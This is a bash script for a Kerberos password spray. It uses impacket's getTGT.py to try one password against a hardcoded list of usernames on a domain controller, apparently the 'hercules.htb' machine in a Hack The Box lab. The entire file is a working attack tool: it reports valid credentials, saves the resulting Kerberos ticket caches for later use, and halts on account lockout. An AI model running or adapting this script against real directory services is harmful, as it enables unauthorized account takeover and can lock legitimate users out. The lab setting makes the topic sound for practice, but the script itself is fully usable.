#!/bin/bash
# Kerberos password spray (NTLM is disabled on this DC, so we must use Kerberos).
# Usage: ./spray.sh 'password'
DC=10.129.242.196
GT=/usr/share/doc/python3-impacket/examples/getTGT.py
PW="$1"
USERS="auditor will.s mark.s ashley.b heather.s stephen.m patrick.s jennifer.a zeke.s tish.c admin administrator"

echo "=== spraying '$PW' ==="
for u in $USERS; do
  out=$(python3 "$GT" "hercules.htb/$u:$PW" -dc-ip $DC 2>&1)
  if echo "$out" | grep -qiE 'Saving ticket|KRB_AS_REP|Got TGT'; then
    echo "  [VALID] $u : $PW"
    [ -f "$u.ccache" ] && mv "$u.ccache" "/home/kali/hercules/$u.ccache"
  elif echo "$out" | grep -qiE 'Password.*incorrect|Preauthentication failed|KDC_ERR_PREAUTH_FAILED'; then
    echo "  [-] $u : wrong password"
  elif echo "$out" | grep -qiE 'account.*locked|STATUS_ACCOUNT_LOCKED'; then
    echo "  [!] $u : LOCKED OUT - stopping"
    break
  else
    echo "  [?] $u : $(echo "$out" | tail -1 | cut -c1-100)"
  fi
  sleep 1
done
